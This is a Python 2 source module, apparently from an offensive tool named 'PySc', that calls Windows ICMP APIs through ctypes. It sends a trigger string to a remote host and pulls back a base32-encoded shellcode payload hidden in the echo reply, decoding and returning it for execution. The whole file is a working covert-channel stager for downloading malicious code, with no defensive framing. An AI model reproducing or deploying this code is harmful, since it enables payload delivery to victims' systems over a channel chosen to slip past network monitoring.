# !/usr/bin/python
# -*- coding: utf-8 -*-

#

"""
	PySc ICMP Request
	This module contains the logic for the following checks .:

	- icmprequest --> Retrieves shellcode from target ICMP
"""

from base64 import b32decode
from socket import inet_ntoa, inet_aton, error
from struct import pack, unpack
from ctypes import *

icmp = windll.icmp

def icmprequest(icmp_trigger, icmp_target, icmp_sc_marker, debug):

    # handles icmp requests

    try:

        class IPAddr(Structure):
            _fields_ = [ ("S_addr", c_ulong),]

            def __str__(self):
                return inet_ntoa(pack("L", self.S_addr))

        class IP_OPTION_INFORMATION(Structure):
            _fields_ = [ ("Ttl", c_ubyte),
                        ("Tos", c_ubyte),
                        ("Flags", c_ubyte),
                        ("OptionsSize", c_ubyte),
                        ("OptionsData", POINTER(c_ubyte)),
                    ]

        class ICMP_ECHO_REPLY(Structure):
            _fields_ = [ ("Address", IPAddr),
                        ("Status", c_ulong),
                        ("RoundTripTime", c_ulong),
                        ("DataSize", c_ushort),
                        ("Reserved", c_ushort),
                        ("Data", LPSTR * 1500),
                        ("Options", IP_OPTION_INFORMATION),
                    ]


        IcmpCreateFile = icmp.IcmpCreateFile
        IcmpCloseHandle = icmp.IcmpCloseHandle

        def inet_addr(ip):
            try:
                return IPAddr(unpack("L", inet_aton(ip))[0])
            except error, msg:
                if debug:
                    print "\n [!] Unable to unpack IP address for " + \
                        "ICMP request::: %s" % msg
                return

        # hard coded options

        data = icmp_trigger  # expected request on the server-side
        timeout = 1000
        options=False

        if debug:
            print "\n [>] Sending ICMP request to %s" % icmp_target

        icmpFile = IcmpCreateFile()  # open icmp handle
        reply = ICMP_ECHO_REPLY()

        if options:
            options = byref(options)

        icmp.IcmpSendEcho(icmpFile, inet_addr(icmp_target),
                                data,
                                len(data),
                                options,
                                byref(reply),
                                sizeof(ICMP_ECHO_REPLY) + len(data),
                                timeout)

        IcmpCloseHandle(icmpFile)  # close icmp handle

        if reply.Status == 0:
            statustext = "(0) Successful"
            if debug:
                print ' [<] Received ICMP response from %s' \
                    % icmp_target
        else:
            if debug:
                print ' [!] Unable to read shellcode from ICMP'
            return

        if reply.Address == "0.0.0.0" and debug:
            print "\n [!] No ICMP response from remote server"
            return

        response = reply.Data[0]

        if response.startswith(icmp_sc_marker):
            datavalue = response
        if not datavalue:
            if debug:
                print ' [!] No shellcode received from %s' \
                    % icmp_target
            return
        else:

            # check that shellcode can be decoded
            # (base32, skipping intial SC marker)

            try:
                shellcode = \
                    b32decode(datavalue[len(icmp_sc_marker):])
                if debug:
                    print ' [>] Returning shellcode from %s via ICMP' \
                        % icmp_target
                return shellcode
            except:
                if debug:
                    print ' [!] Cannot decode shellcode from ICMP (%s)' \
                        % icmp_target
                return
    except:
        if debug:
            print ' [!] Unable to retrieve shellcode from ICMP (%s)' \
                % icmp_target
        return